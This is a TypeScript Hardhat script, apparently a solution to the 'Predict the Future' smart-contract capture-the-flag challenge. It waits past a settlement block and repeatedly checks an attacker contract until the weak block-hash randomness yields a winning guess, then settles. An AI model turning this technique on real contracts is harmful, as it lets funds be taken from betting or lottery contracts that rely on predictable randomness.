import { ethers } from "hardhat";

const challengeAddress = "0x7d97571d19E612460Dba414320998692Cf1C699F";
function sleep(time: number) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

async function main() {
  const [player] = await ethers.getSigners();
  // const PredictTheFutureAttacker = await ethers.getContractFactory(
  //   "PredictTheFutureAttacker",
  //   player
  // );

  // const attacker = await PredictTheFutureAttacker.deploy(challengeAddress);
  // await attacker.deployed();

  const attacker = await ethers.getContractAt(
    "PredictTheFutureAttacker",
    "0xAB513939E957400d31f22B5f0B93d5f966c6989e",
    player
  );
  // let tx = await attacker.guess({ value: ethers.utils.parseEther("1") });
  // await tx.wait();
  console.log("GUESSED!");
  const settlementBlock = await attacker.settlementBlock();
  let latestBlock = (await ethers.provider.getBlock("latest")).number;
  while (
    ethers.BigNumber.from(latestBlock).lte(
      ethers.BigNumber.from(settlementBlock)
    )
  ) {
    console.log("BLOCKNUMBER INVALID");
    latestBlock = (await ethers.provider.getBlock("latest")).number;
    await sleep(3000);
  }
  while (!(await attacker.check())) {
    console.log("UNLUCKY!");
    await sleep(1500);
  }
  console.log("CHECKED!");
  const tx = await attacker.settle({ gasLimit: 1e6 });
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
